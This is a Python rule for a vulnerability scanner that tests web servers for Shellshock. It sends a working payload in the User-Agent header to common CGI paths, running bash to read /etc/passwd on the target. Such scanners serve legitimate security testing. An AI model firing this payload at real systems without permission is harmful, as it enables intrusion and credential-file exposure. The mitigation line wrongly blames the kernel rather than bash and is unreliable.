import re

from core.redis import rds
from core.triage import Triage
from core.parser import ScanParser, ConfParser
from db.db_paths import COMMON_CGI_PATHS

class Rule:
  def __init__(self):
    self.rule = 'VLN_88GV'
    self.rule_severity = 4
    self.rule_description = 'Remote Code Execution Via User-Agent shellshock'
    self.rule_confirm = 'Shellshock RCE'
    self.rule_details = ''
    self.rule_mitigation = '''Patch the vulnerable system's kernel to a non-vulnerable version.'''
    self.intensity = 3

  def check_rule(self, ip, port, values, conf):
    c = ConfParser(conf)
    t = Triage()
    p = ScanParser(port, values)

    domain = p.get_domain()
    module = p.get_module()

    if 'http' not in module:
      return

    for uri in COMMON_CGI_PATHS:
      
      resp = t.http_request(ip, port, uri=uri, headers={'User-Agent':"() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'"})

      if not resp:
        continue

      if resp and re.search('root:[x*]:0:0', resp.text):
        self.rule_details = 'Remote Code Execution Shellshock'
        js_data = {
          'ip': ip,
          'port': port,
          'domain': domain,
          'rule_id': self.rule,
          'rule_sev': self.rule_severity,
          'rule_desc': self.rule_description,
          'rule_confirm': self.rule_confirm,
          'rule_details': self.rule_details,
          'rule_mitigation': self.rule_mitigation
        }

        rds.store_vuln(js_data)
        break

    return